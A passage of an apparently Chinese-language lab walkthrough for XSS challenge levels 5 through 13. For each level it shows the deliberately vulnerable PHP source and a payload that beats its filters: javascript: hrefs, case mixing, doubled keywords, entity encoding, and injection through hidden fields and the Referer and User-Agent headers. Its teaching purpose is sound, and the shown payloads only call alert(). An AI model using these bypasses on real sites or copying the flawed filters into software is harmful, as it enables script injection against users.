alt="image-20231030221332426"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level5.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str3</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>script跟on被拆了</p><p>大小写结合被拦截（strtolower已经将字符串转换为了小写）</p><p><strong>a-href标签法</strong></p><p>href属性的意思是 当标签<code>&lt;a&gt;</code>被点击的时候，就会触发执行转跳，可以是转跳到一个网站，还可以触发执行一段js代码</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-tag">&lt;<span class="hljs-name">a</span> <span class="hljs-attr">href</span>=<span class="hljs-string">javascript:alert(</span>&#x27;<span class="hljs-attr">x</span>&#x27;)&gt;</span>xxx<span class="hljs-tag">&lt;/<span class="hljs-name">a</span>&gt;</span><br></code></pre></td></tr></table></figure><p>想办法插入</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;&gt; &lt;a href=javascript:alert(&#x27;x&#x27;)&gt;xxx&lt;/a&gt; &quot;</span><br></code></pre></td></tr></table></figure><h2 id="level-6（大小写绕过）"><a href="#level-6（大小写绕过）" class="headerlink" title="level-6（大小写绕过）"></a><strong>level-6（大小写绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/30/Af470.png" alt="image-20231030221714062"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;script&quot;</span>,<span class="hljs-string">&quot;&lt;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level6.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>没有strtolower函数，没过滤大小写。</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;&gt; &lt;a Href=javascript:alert(&#x27;x&#x27;)&gt;xxx&lt;/a&gt; &quot;</span><br></code></pre></td></tr></table></figure><h2 id="level-7（关键字复写绕过）"><a href="#level-7（关键字复写绕过）" class="headerlink" title="level-7（关键字复写绕过）"></a><strong>level-7（关键字复写绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/30/Af5DC.png" alt="image-20231030221900971"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> =<span class="hljs-title function_ invoke__">strtolower</span>( <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<span class="hljs-comment">//大小写转换</span><br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level7.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-variable">$str6</span>.<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=搜索 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>关键字只检测过滤一次</p><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-string">&quot;&gt; &lt;a hrhrefef=javascscriptript:alert(&#x27;x&#x27;)&gt;xxx&lt;/a&gt; &quot;</span><br></code></pre></td></tr></table></figure><h2 id="level-8（href隐藏属性绕过）"><a href="#level-8（href隐藏属性绕过）" class="headerlink" title="level-8（href隐藏属性绕过）"></a><strong>level-8（href隐藏属性绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AIVK3.png"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;form action=level8.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string"></span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br> <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>先进行大小写转换，然后各种关键字打乱，最后双引还给标签实体化了</p><p>href的一个隐藏的属性：href在调用openurl传参时会自动进行解码</p><p>payload</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">javascript:<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;x&#x27;</span>)<br><span class="hljs-comment">//Unicode转ASCII</span><br>&amp;<span class="hljs-comment">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#120;&amp;#39;&amp;#41;</span><br></code></pre></td></tr></table></figure><p><a href="https://tool.chinaz.com/tools/unicode.aspx">https://tool.chinaz.com/tools/unicode.aspx</a></p><h2 id="level-9（href隐藏属性绕过）"><a href="#level-9（href隐藏属性绕过）" class="headerlink" title="level-9（href隐藏属性绕过）"></a><strong>level-9（href隐藏属性绕过）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AI20H.png" alt="image-20231031154938873"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-title function_ invoke__">strtolower</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>]);<br><span class="hljs-variable">$str2</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;script&quot;</span>,<span class="hljs-string">&quot;scr_ipt&quot;</span>,<span class="hljs-variable">$str</span>);<br><span class="hljs-variable">$str3</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;on&quot;</span>,<span class="hljs-string">&quot;o_n&quot;</span>,<span class="hljs-variable">$str2</span>);<br><span class="hljs-variable">$str4</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;src&quot;</span>,<span class="hljs-string">&quot;sr_c&quot;</span>,<span class="hljs-variable">$str3</span>);<br><span class="hljs-variable">$str5</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;data&quot;</span>,<span class="hljs-string">&quot;da_ta&quot;</span>,<span class="hljs-variable">$str4</span>);<br><span class="hljs-variable">$str6</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;href&quot;</span>,<span class="hljs-string">&quot;hr_ef&quot;</span>,<span class="hljs-variable">$str5</span>);<br><span class="hljs-variable">$str7</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&#x27;&quot;&#x27;</span>,<span class="hljs-string">&#x27;&amp;quot&#x27;</span>,<span class="hljs-variable">$str6</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form action=level9.php method=GET&gt;</span><br><span class="hljs-string">&lt;input name=keyword  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&#x27;&quot;&gt;</span><br><span class="hljs-string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">if</span>(<span class="hljs-literal">false</span>===<span class="hljs-title function_ invoke__">strpos</span>(<span class="hljs-variable">$str7</span>,<span class="hljs-string">&#x27;http://&#x27;</span>))<br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;您的链接不合法？有没有！&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>        &#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>  <span class="hljs-keyword">echo</span> <span class="hljs-string">&#x27;&lt;center&gt;&lt;BR&gt;&lt;a href=&quot;&#x27;</span>.<span class="hljs-variable">$str7</span>.<span class="hljs-string">&#x27;&quot;&gt;友情链接&lt;/a&gt;&lt;/center&gt;&#x27;</span>;<br>&#125;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs php">javascript:<span class="hljs-title function_ invoke__">alert</span>(<span class="hljs-string">&#x27;http://&#x27;</span>)<br>绕过检验链接合法步骤，可以直接将http:<span class="hljs-comment">//暴漏在外，所以不对其进行Unicode编码处理。</span><br>&amp;<span class="hljs-comment">#106;&amp;#97;&amp;#118;&amp;#97;&amp;#115;&amp;#99;&amp;#114;&amp;#105;&amp;#112;&amp;#116;&amp;#58;&amp;#97;&amp;#108;&amp;#101;&amp;#114;&amp;#116;&amp;#40;&amp;#39;&amp;#39;&amp;#41;//http://</span><br></code></pre></td></tr></table></figure><h2 id="level-10（猜解参数名）"><a href="#level-10（猜解参数名）" class="headerlink" title="level-10（猜解参数名）"></a><strong>level-10（猜解参数名）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AIFtD.png" alt="image-20231031155331765"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str11</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;text&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>输入框被hidden了，我们把type改成 text即可</p><p><img src="https://i0.imgs.ovh/2023/10/31/AInO5.png" alt="image-20231031155746234"></p><p>payload：</p><figure class="highlight arcade"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs arcade">?t_sort=<span class="hljs-string">&quot; type=&quot;</span><span class="hljs-built_in">text</span><span class="hljs-string">&quot; onclick=&quot;</span>alert(<span class="hljs-string">&#x27;xss&#x27;</span>)<br></code></pre></td></tr></table></figure><h2 id="level-11（http头传值）"><a href="#level-11（http头传值）" class="headerlink" title="level-11（http头传值）"></a><strong>level-11</strong>（http头传值）</h2><p><img src="https://i0.imgs.ovh/2023/10/31/AIB3R.png" alt="image-20231031162938096"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_REFERER&#x27;</span>];<br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ref&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>查看源码</p><p><img src="https://i0.imgs.ovh/2023/10/31/AIIQp.png" alt="image-20231031163242642"></p><p>referer头也成了输出参数，我们从这个下手，打开postman 或者 burpsuite，将payload写到referer里</p><p>payload：+</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot; type=&quot;</span><span class="hljs-variable">text</span><span class="hljs-string">&quot; onmousemove=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h2 id="level-12（User-Agent头传值）"><a href="#level-12（User-Agent头传值）" class="headerlink" title="level-12（User-Agent头传值）"></a><strong>level-12（User-Agent头传值）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AIhET.png" alt="image-20231031163505883"></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <br><span class="hljs-title function_ invoke__">ini_set</span>(<span class="hljs-string">&quot;display_errors&quot;</span>, <span class="hljs-number">0</span>);<br><span class="hljs-variable">$str</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;keyword&quot;</span>];<br><span class="hljs-variable">$str00</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&quot;t_sort&quot;</span>];<br><span class="hljs-variable">$str11</span>=<span class="hljs-variable">$_SERVER</span>[<span class="hljs-string">&#x27;HTTP_USER_AGENT&#x27;</span>];<span class="hljs-comment">//获取用户客户端属性</span><br><span class="hljs-variable">$str22</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&gt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str11</span>);<br><span class="hljs-variable">$str33</span>=<span class="hljs-title function_ invoke__">str_replace</span>(<span class="hljs-string">&quot;&lt;&quot;</span>,<span class="hljs-string">&quot;&quot;</span>,<span class="hljs-variable">$str22</span>);<br><span class="hljs-keyword">echo</span> <span class="hljs-string">&quot;&lt;h2 align=center&gt;没有找到和&quot;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str</span>).<span class="hljs-string">&quot;相关的结果.&lt;/h2&gt;&quot;</span>.<span class="hljs-string">&#x27;&lt;center&gt;</span><br><span class="hljs-string">&lt;form id=search&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_link&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_history&quot;  value=&quot;&#x27;</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_sort&quot;  value=&quot;&#x27;</span>.<span class="hljs-title function_ invoke__">htmlspecialchars</span>(<span class="hljs-variable">$str00</span>).<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;input name=&quot;t_ua&quot;  value=&quot;&#x27;</span>.<span class="hljs-variable">$str33</span>.<span class="hljs-string">&#x27;&quot; type=&quot;hidden&quot;&gt;</span><br><span class="hljs-string">&lt;/form&gt;</span><br><span class="hljs-string">&lt;/center&gt;&#x27;</span>;<br><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><p>与11关同理</p><p>payload：</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs isbl"><span class="hljs-string">&quot; type=&quot;</span><span class="hljs-variable">text</span><span class="hljs-string">&quot; onmousemove=&quot;</span><span class="hljs-function"><span class="hljs-title">alert</span>(<span class="hljs-number">1</span>)</span><br></code></pre></td></tr></table></figure><h2 id="level-13（Cookie传值）"><a href="#level-13（Cookie传值）" class="headerlink" title="level-13（Cookie传值）"></a><strong>level-13（Cookie传值）</strong></h2><p><img src="https://i0.imgs.ovh/2023/10/31/AIxlu.png" alt="image-20231031163733009"></p><p>与11关同理</p><p>payload：</p><figure 